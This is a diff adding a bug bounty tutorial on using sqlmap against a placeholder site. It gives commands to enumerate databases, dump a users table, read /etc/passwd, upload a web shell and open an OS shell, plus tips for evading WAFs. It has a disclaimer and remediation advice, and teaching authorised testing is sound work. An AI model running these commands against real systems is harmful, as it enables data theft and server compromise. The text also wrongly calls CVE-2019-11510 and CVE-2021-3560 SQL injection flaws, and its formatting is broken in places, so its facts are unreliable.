@@ -1,0 +1,155 @@
+SQL Injection Mastery: A Bug Bounty Hunter's Guide to sqlmap
+
+ Overview: The Gravity of SQL Injection
+
+SQL Injection (SQLi)** is not just a vulnerability; it is a **systemic failure** in an application's communication with its database. It remains one of the most severe web application security risks, consistently featuring in the **OWASP Top 10**. A successful SQLi attack can lead to a complete compromise of the application's sensitive data, including user credentials, personal identifiable information (PII), financial records, and intellectual property.
+
+Why is it so dangerous? It directly breaches the trust boundary between the application and its data store. Attackers can not only **read** sensitive data but also **modify** it (insert, update, delete), potentially destroying data integrity, and in some cases, escalate to **command execution** on the underlying server.
+
+### Key Severity and CVEs
+Severity: Critical (CVSS Score: 9.0+). The impact is often a direct loss of confidentiality, integrity, and availability.
+ Notable Historical CVEs: While SQLi is a vulnerability class itself (often CWE-89), specific implementations have had monumental impact:
+    *   CVE-2019-11510 (Critical): Pre-auth SQLi in Pulse Secure VPNs.
+    *   CVE-2023-34362 (Critical): SQLi in MOVEit Transfer leading to RCE.
+    *   CVE-2021-3560 (Critical): SQLi in Polkit's authentication bypass.
+
+
+## The Tool of Choice: sqlmap
+
+sqlmap is the industry-standard, open-source penetration testing tool that automates the process of **detecting** and **exploiting** SQL injection flaws. Its powerful engine supports a vast range of database management systems (DBMS) like MySQL, PostgreSQL, Microsoft SQL Server, and Oracle, and can tackle various injection types, including boolean-based blind, time-based blind, UNION query, and stacked queries.
+
+> Ethical & Legal Imperative: The commands and techniques described below are for **authorised security testing only**. Always obtain **explicit written permission** before testing any system. Unauthorised access is illegal. Operate strictly within the scope of a **bug bounty program** or a **penetration testing engagement**.
+
+
+## The Attack Progression: From Detection to Full Compromise
+
+A methodical approach is key. The following command series represents a standard escalation path for a bug bounty hunter.
+
+### 1. Initial Detection & Probing
+Goal: Confirm the presence of a vulnerability and fingerprint the environment.
+
+Target: A potentially vulnerable URL parameter (e.g., `id`, `user_id`).
+`http://vulnerable-site.com/products.php?id=1`
+
+Command:
+```bash
+sqlmap -u "http://vulnerable-site.com/products.php?id=1" --batch
+```
+*   `--batch`: Runs non-interactively, automatically choosing default options. Essential for automation.
+
+What it tells you:
+*   Is the parameter `id` injectable?
+*   What is the **back-end DBMS** (e.g., MySQL)?
+*   What **injection technique** is most effective?
+
+### 2. Environment Enumeration
+Goal: Understand the attack surface—who you are, what database you're in, and what other databases are available.
+
+Command:
+bash
+sqlmap -u "http://vulnerable-site.com/products.php?id=1" --batch --current-db --current-user --hostname --dbs
+
+*   `--current-db`: Name of the current database.
+*   `--current-user`: Database user account being used. Is it privileged?
+*   `--hostname: Server hostname.
+*   `--dbs`: Enumerates all available databases.
+
+Sample Finding:
+> Current user is `'app_reader@%'`, which has limited privileges. The current database is `ecommerce_db`. Other databases found: `ecommerce_db`, `mysql`, `dev_backup`. The `dev_backup` database may contain sensitive test data.
+
+### 3. Database & Table Enumeration
+Goal: Map the structure of the target database to find tables of interest (e.g., `users`, `customers`, `transactions`).
+
+Command:
+```bash
+sqlmap -u "http://vulnerable-site.com/products.php?id=1" --batch -D ecommerce_db --tables
+```
+   `-D`: Specifies the database to target.
+`--tables`**: Lists all tables within the specified database.
+
+Sample Finding:
+> Database: `ecommerce_db`
+> Tables: `[6] products, users, logs, transactions, api_keys, config`
+
+### 4. Column Enumeration
+Goal:Understand the structure of a high-value table to identify specific columns for extraction.
+
+Command:
+```bash
+sqlmap -u "http://vulnerable-site.com/products.php?id=1" --batch -D ecommerce_db -T users --columns
+```
+*   -T: Specifies the table to target.
+*   '--columns: Lists all columns and their data types within the specified table.
+
+Sample Finding:
+> Table: `users`
+> Columns: `[7] id (int), username (varchar), password_hash (varchar), email (varchar), role (varchar), last_login (datetime), password_reset_token (varchar)`
+
+### 5. Data Exfiltration (The Crown Jewels)
+Goal: Extract the actual sensitive data from the target table.
+
+Command:
+```bash
+sqlmap -u "http://vulnerable-site.com/products.php?id=1" --batch -D ecommerce_db -T users --dump
+```
+*   `--dump`: Dumps the entire content of the specified table.
+
+This is the critical payload. This command extracts every row from the `users` table. If passwords are hashed, sqlmap can optionally attempt to crack them if provided with a wordlist.
+
+# 6. Privilege Escalation & Post-Exploitation
+Goal: Leverage database privileges to achieve higher impact, such as reading files or gaining OS access.
+
+These commands require a highly privileged database user (e.g., `root`, `sa`).
+
+*   Read Files from the Server:
+    ```bash
+    sqlmap -u "http://vulnerable-site.com/products.php?id=1" --file-read="/etc/passwd"
+    ```
+    *   Impact: Access to sensitive system files, application source code, or configuration files containing API keys and passwords.
+
+*   Write Files / Upload a Web Shell:
+    ```bash
+    sqlmap -u "http://vulnerable-site.com/products.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+    ```
+    *   Impact: Achieves Remote Code Execution (RCE), the ultimate escalation, allowing full control over the web server.
+
+*   OS Command Execution:
+    ```bash
+    sqlmap -u "http://vulnerable-site.com/products.php?id=1" --os-shell
+    ```
+    *   Impact: Provides an interactive system shell on the database server, leading to a full network compromise.
+
+---
+
+## Pro-Tips for Bug Bounty Hunters
+
+1.  Stealth is Key: Avoid detection by Web Application Firewalls (WAFs) and Intrusion Detection Systems (IDS).
+    *   `--delay=1`: Adds a delay (in seconds) between requests.
+    *   `--user-agent="Mozilla/5.0..."`: Spoof a legitimate user agent.
+    *   `--proxy="http://127.0.0.1:8080"`: Route traffic through Burp Suite to analyze and manipulate requests manually.
+
+2.  Handle POST Requests: For login forms or API endpoints.
+    ```bash
+    sqlmap -u "http://target.com/login" --data="username=admin&password=admin" --batch
+    ```
+
+3.  **Handle Authentication:** Use cookies to test authenticated endpoints.
+    ```bash
+    sqlmap -u "http://target.com/profile" --cookie="PHPSESSID=abc123; security=low" --batch
+    ```
+
+4.  Risk Management: Use `--level` and `--risk` parameters to control the aggressiveness and number of payloads tested. Start with lower levels to avoid crashing the application.
+
+## Conclusion: Reporting & Remediation
+
+When you find a SQLi vulnerability, your report must be clear and actionable.
+
+*   Proof of Concept (PoC): Provide the exact `sqlmap` command you used to extract data (e.g., `--current-user` output).
+*   Impact: Clearly state what data is accessible. "An attacker can dump the entire `users` table, exposing hashed passwords and PII."
+*   Remediation:
+    *   Use Prepared Statements (Parameterized Queries) instead of string concatenation within queries.
+    *   Use ORMs (Object-Relational Mappers) correctly.
+    *   Implement strict Input Validation and principle of least privilege for database accounts.
+    *   Regularly perform security testing and code reviews.
+
+Happy (and ethical) hunting!
